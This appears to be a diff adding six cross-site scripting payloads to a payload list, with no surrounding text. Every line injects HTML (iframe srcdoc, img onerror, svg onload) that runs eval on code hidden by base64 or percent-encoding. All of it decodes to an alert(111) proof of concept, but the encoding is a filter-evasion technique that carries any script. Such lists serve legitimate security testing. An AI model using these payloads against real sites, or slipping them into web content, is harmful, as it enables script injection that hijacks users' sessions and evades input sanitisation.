@@ -1,0 +1,6 @@
+<iframe srcdoc="<img src=x onerror=eval(atob('YWxlcnQoMTExKQ=='))>"></iframe>
+<svg onload="eval(unescape('%61%6c%65%72%74%28%31%31%31%29'))">
+<svg onload="eval(atob('YWxlcnQoMTExKQ=='))">
+<svg onload="eval(unescape('%61%6c%65%72%74%28%31%31%31%29'))">
+<iframe srcdoc="<svg onload=eval(atob('YWxlcnQoMTExKQ=='))>"></iframe>
+<svg onload="eval(atob('YWxlcnQoMTExKQ=='))">
